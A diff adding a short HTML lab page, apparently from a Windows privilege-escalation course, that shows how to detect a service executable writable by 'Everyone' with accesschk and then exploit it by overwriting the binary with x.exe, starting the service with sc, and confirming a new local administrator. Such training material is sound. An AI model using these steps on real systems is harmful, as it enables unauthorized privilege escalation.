@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Overview (Executable Files)</title>
+</head><body><span style="font-size: 15pt">Detection<br/>
+<br/>
+Windows VM<br/>
+<br/>
+1. Open command prompt and type: <b>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"</b><br/>
+2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.<br/>
+<br/>
+Exploitation<br/>
+<br/>
+Windows VM<br/>
+<br/>
+1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"<br/>
+2. In command prompt type: sc start filepermsvc<br/>
+3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</span></body></html>
